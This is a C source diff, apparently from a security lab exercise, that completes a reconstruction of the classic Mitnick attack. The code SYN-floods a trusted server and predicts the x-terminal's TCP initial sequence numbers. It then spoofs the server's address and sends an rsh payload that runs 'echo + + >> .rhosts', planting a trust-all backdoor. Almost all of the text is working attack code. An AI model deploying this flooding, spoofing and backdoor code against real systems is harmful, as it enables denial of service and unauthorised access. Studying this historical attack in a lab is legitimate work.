@@ -56,17 +56,17 @@ struct tcp_hdr
 };
 
 
-void send_syn(uint16_t dest_port, uint8_t *payload, uint32_t payload_s, libnet_t *l, uint32_t server_ip, uint32_t my_ip)
+void send_syn(uint16_t dest_port, uint8_t *payload, uint32_t payload_s, libnet_t *l, uint32_t dest_ip, uint32_t src_ip, uint32_t seq_nr, uint32_t ack_nr)
 {
 
     libnet_ptag_t tcp_tag = LIBNET_PTAG_INITIALIZER;
     libnet_ptag_t ip_tag = LIBNET_PTAG_INITIALIZER;
     // build syn
     tcp_tag = libnet_build_tcp(
-        libnet_get_prand(LIBNET_PRu16), // source port
+        513, // source port
         dest_port,                      // destinatin port
-        libnet_get_prand(LIBNET_PRu32), // seq nr
-        0,                              // ack number
+        seq_nr, // seq nr
+        ack_nr,                              // ack number
         TH_SYN,                         // flag
         1024,                           // window size
         0,                              // checksum (0 for libnet to auto-fill)
@@ -90,11 +90,11 @@ void send_syn(uint16_t dest_port, uint8_t *payload, uint32_t payload_s, libnet_t
         0,                                        // type of service bits
         0,                                        // IP id (identification number)
         0,                                        // fragmentation bits and offset
-        libnet_get_prand(LIBNET_PR8),             // time to live in the network
+        64,             // time to live in the network
         IPPROTO_TCP,                              // upper layer protocol
         0,                                        // checksum (0 for libnet to auto-fill)
-        my_ip,                                    // source IPv4 address (little endian)
-        server_ip,                                // destination IPv4 address (little endian)
+       src_ip,                                    // source IPv4 address (little endian)
+       dest_ip,                                // destination IPv4 address (little endian)
 //        libnet_name2addr4(l, "127.0.0.1", LIBNET_RESOLVE), // destination IPv4 address (little endian)
         NULL,                                              // optional payload or NULL
         0,                                                 // payload length or 0
@@ -117,7 +117,6 @@ void send_syn(uint16_t dest_port, uint8_t *payload, uint32_t payload_s, libnet_t
         printf("Error sending syn packet\n");
         exit(1);
     }
-
     libnet_clear_packet(l);
 }
 
@@ -133,7 +132,9 @@ void start_ddos(libnet_t *l, u_long server_ip, u_long own_ip)
                  7,
                  l,
                  server_ip,
-                 own_ip);
+                 own_ip,
+                 libnet_get_prand(LIBNET_PRu32),
+                 libnet_get_prand(LIBNET_PRu32));
     };
 }
 
@@ -145,7 +146,9 @@ void stop_ddos(libnet_t *l, u_long server_ip, u_long own_ip)
              6,
              l,
              server_ip,
-             own_ip);
+             own_ip,
+             libnet_get_prand(LIBNET_PRu32),
+             libnet_get_prand(LIBNET_PRu32));
 }
 
 libnet_t *libnet_initialize() {
@@ -222,10 +225,11 @@ uint32_t predict (pcap_t *handler, libnet_t *l, u_long xterminal_ip, u_long own_
     uint32_t constant_second_order_diff = 29281;
 
     printf("Probing now:\n");
+    int ready_to_guess = 0;
     int i;
     for (i = 0; i < amt_iter; i++)
     {
-        send_syn(514, NULL, 0, l, xterminal_ip, own_ip);
+        send_syn(514, NULL, 0, l, xterminal_ip, own_ip, libnet_get_prand(LIBNET_PRu32), libnet_get_prand(LIBNET_PRu32));
         
         struct pcap_pkthdr header;
         const u_char *packet = pcap_next(handler, &header);
@@ -239,7 +243,6 @@ uint32_t predict (pcap_t *handler, libnet_t *l, u_long xterminal_ip, u_long own_
         uint32_t seq = ntohl(tcp_header->th_seq);
         uint32_t ack = ntohl(tcp_header->th_ack);
         
-        // usleep(1000);
         printf("received seq %u, ack %u\n", seq, ack);
         seq_array[i] = (uint32_t)seq;
         
@@ -252,19 +255,88 @@ uint32_t predict (pcap_t *handler, libnet_t *l, u_long xterminal_ip, u_long own_
             if(i > 1) {
                 // Calc second order diff
                 int32_t second_order_diff = (int32_t)diff_array[i-1] - (int32_t)diff_array[i-2];
-//                printf("Diff[%u] - Diff[%u]: %d\n", i, i-1,second_order_diff);
+                printf("Diff[%u] - Diff[%u]: %d\n", i, i-1,second_order_diff);
                 
                 if(second_order_diff != constant_second_order_diff) {
-                    int32_t next_diff = constant_second_order_diff + diff_array[i-1];
-//                    printf("Next diff will be: %d\n",next_diff);
-                    uint32_t next_seq = seq_array[i] + next_diff;
-                    printf("Next sequence number will be: %u\n",next_seq);
-                    pcap_close(handler);
-                    return next_seq;
+                    if (ready_to_guess == 1){
+                        int32_t next_diff = constant_second_order_diff + diff_array[i-1];
+                        printf("Next diff will be: %d\n",next_diff);
+                        uint32_t next_seq = seq_array[i] + next_diff;
+                        printf("Next sequence number will be: %u\n",next_seq);
+                        pcap_close(handler);
+                        return next_seq;
+                    } else {
+                        ready_to_guess = 1;
+                    }
                 }
             }
         }
     }
+    return -1;
+}
+
+void send_ack(uint16_t dest_port, uint8_t *payload, uint32_t payload_s, libnet_t *l, uint32_t xterminal_ip, uint32_t server_ip, uint32_t seq_nr, uint32_t ack_nr,uint8_t flags){
+    
+    libnet_ptag_t tcp_tag = LIBNET_PTAG_INITIALIZER;
+    libnet_ptag_t ip_tag = LIBNET_PTAG_INITIALIZER;
+    // build ack
+    tcp_tag = libnet_build_tcp(
+        513, // source port
+        dest_port,                      // destinatin port
+        seq_nr, // seq nr
+        ack_nr,                              // ack number
+        flags,                         // flag
+        1024,                           // window size
+        0,                              // checksum (0 for libnet to auto-fill)
+        0,                             // urgent pointer
+        LIBNET_TCP_H + payload_s,       // length is header size plus payload size
+        payload,                        // payload
+        payload_s,                      // payload size
+        l,                              // pointer to libnet context
+        0                               // protocol tag to modify an existing header, 0 to build a new one
+    );
+
+    if (tcp_tag < 0)
+    {
+        fprintf(stderr, "Error building ack tcp_tag.\n");
+        libnet_destroy(l);
+        exit(1);
+    }
+
+    ip_tag = libnet_build_ipv4(
+        LIBNET_IPV4_H + LIBNET_TCP_H + payload_s, // total length of the IP packet including all subsequent data
+        0,                                        // type of service bits
+        0,                                        // IP id (identification number)
+        0,                                        // fragmentation bits and offset
+        libnet_get_prand(LIBNET_PR8),             // time to live in the network
+        IPPROTO_TCP,                              // upper layer protocol
+        0,                                        // checksum (0 for libnet to auto-fill)
+        server_ip,                                    // source IPv4 address (little endian)
+        xterminal_ip,                                // destination IPv4 address (little endian)
+//        libnet_name2addr4(l, "127.0.0.1", LIBNET_RESOLVE), // destination IPv4 address (little endian)
+        NULL,                                              // optional payload or NULL
+        0,                                                 // payload length or 0
+        l,                                                 // pointer to a libnet context
+        0                                                  // protocol tag to modify an existing header, 0 to build a new one
+    );
+
+    if (ip_tag < 0)
+    {
+        fprintf(stderr, "Error building ip_tag.\n");
+        libnet_destroy(l);
+        exit(1);
+    }
+
+    // send ack packet
+    int success = libnet_write(l);
+    if (success == -1)
+    {
+        fprintf(stderr, "Error: %s\n", l->err_buf);
+        printf("Error sending ack packet\n");
+        exit(1);
+    }
+
+    libnet_clear_packet(l);
 }
 
 
@@ -295,17 +367,28 @@ int main(void)
     }
     
     // STEP 1: DOS the server (TCP SYN flood)
-
- 
-
     start_ddos(l, server_ip, own_ip);
 
     // STEP 2: TCP ISN Probe the xterminal (Determine how the xterminal generates ISNs)
     // Setup the sniffing stuff
     pcap_t *handler = setup_sniff_handler();
     
-    
     uint32_t next_seq_pred = predict(handler, l, xterminal_ip, own_ip);
     
     // STEP 3: IP spoof server & TCP connection
+    u_int32_t my_seq = libnet_get_prand(LIBNET_PRu32);
+    printf("now sending syn as server\n");
+//    sleep(2);
+    send_syn(514, NULL, 0, l, xterminal_ip, server_ip, my_seq, libnet_get_prand(LIBNET_PRu32));
+    printf("sent syn as server! Now wait for syn/ack from xterminal to server\n");
+//    sleep(2);
+
+    printf("Injecting backdoor \n");
+    
+    char payload[] = {"0\0tsutomu\0tsutomu\0echo + + >> .rhosts\0"};
+    uint32_t payload_size = sizeof(payload);
+    printf("payload_size %u\n",payload_size);
+    send_ack(514, payload, payload_size, l, xterminal_ip, server_ip, my_seq + 1, next_seq_pred + 1, TH_PUSH|TH_ACK);
+    printf("sent ack as server. backdoor injected\n");
+    stop_ddos(l, server_ip, own_ip);
 }
